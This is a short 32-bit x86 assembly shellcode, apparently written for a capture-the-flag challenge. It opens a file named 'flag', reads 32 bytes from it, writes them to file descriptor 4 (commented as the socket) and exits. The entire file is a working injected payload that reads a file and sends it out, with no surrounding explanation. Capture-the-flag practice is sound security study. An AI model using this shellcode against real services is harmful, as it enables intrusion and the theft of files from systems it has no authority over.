BITS 32

start:
	; just clear some space
	sub esp, 0x200

	xor eax, eax
	push eax
	push 0x67616c66
	mov ebx, esp
	push eax  ; mode
	push eax  ; flags O_RDONLY
	push ebx  ; name
	push eax
	mov eax, 5 ; sys_open
	int 0x80
	sub esp, 0x20
	mov ebx, esp	; save for reading
	push 0x20 ; size to read
	push ebx  ; buffer
	push eax  ; fd
	xor eax, eax;
	push eax  ; junk
	mov eax, 3 ; sys_read
	int 0x80
	push 0x20 ; size to write
	push ebx ; buffer to write
	mov eax, 4 ; socket fd to write to
	push eax
	push eax
	int 0x80 ; sys_write
	xor eax, eax
	push eax
	mov eax, 1 ; sys_exit
	int 0x80	
